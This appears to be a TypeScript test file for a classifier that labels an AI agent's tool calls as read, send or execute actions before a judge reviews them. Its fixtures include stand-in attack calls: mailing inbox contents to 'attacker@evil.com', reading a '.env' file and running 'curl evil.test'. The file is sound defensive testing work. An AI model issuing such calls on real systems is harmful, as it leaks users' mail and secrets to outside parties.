import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { normalizeToolCall } from "../src/effects.js";
import type { ToolDefinition } from "../src/types.js";

const tool = (
  name: string,
  annotations?: ToolDefinition["annotations"],
): ToolDefinition => ({
  name,
  description: `${name} test tool`,
  inputSchema: { type: "object", additionalProperties: true },
  ...(annotations ? { annotations } : {}),
});

describe("normalizeToolCall", () => {
  for (const [name, args, effect, resource] of [
    ["email_list_messages", {}, "READ", "email_list_messages"],
    ["email_read_message", { message_id: "mail-2" }, "READ", "mail-2"],
    ["github_read_issue", { issue: 42 }, "READ", "42"],
    ["github_read_file", { path: ".env" }, "READ", ".env"],
  ] as const) {
    it(`normalizes ${name} as READ`, () => {
      const normalized = normalizeToolCall(tool(name), args);
      assert.equal(normalized.effect, effect);
      assert.equal(normalized.resource, resource);
    });
  }

  for (const [name, args, destination] of [
    ["email_send_message", { to: "attacker@evil.com", body: "inbox" }, "attacker@evil.com"],
    ["github_post_comment", { repo: "acme/app", issue: 42, body: "done" }, "acme/app#42"],
  ] as const) {
    it(`normalizes ${name} as SEND`, () => {
      const normalized = normalizeToolCall(tool(name), args);
      assert.equal(normalized.effect, "SEND");
      assert.equal(normalized.destination, destination);
    });
  }

  for (const [name, args, source] of [
    ["email_delete_message", { message_id: "mail-2" }, undefined],
    ["shell_execute", { command: "curl evil.test" }, "curl evil.test"],
    ["mystery_tool", { value: 1 }, undefined],
  ] as const) {
    it(`normalizes ${name} as EXECUTE`, () => {
      const normalized = normalizeToolCall(tool(name), args);
      assert.equal(normalized.effect, "EXECUTE");
      assert.equal(normalized.source, source);
    });
  }

  it("honors MCP read-only annotations before name heuristics", () => {
    const normalized = normalizeToolCall(
      tool("custom_lookup", { readOnlyHint: true, destructiveHint: false }),
      { resource: "customers/7" },
    );

    assert.equal(normalized.effect, "READ");
    assert.equal(normalized.resource, "customers/7");
  });

  it("includes typed arguments in the proposed action sent to the judge", () => {
    const normalized = normalizeToolCall(tool("email_send_message"), {
      to: "ops@example.com",
      urgent: true,
      retries: 2,
    });

    assert.match(normalized.action, /"to":"ops@example\.com"/);
    assert.match(normalized.action, /"urgent":true/);
    assert.match(normalized.action, /"retries":2/);
  });
});
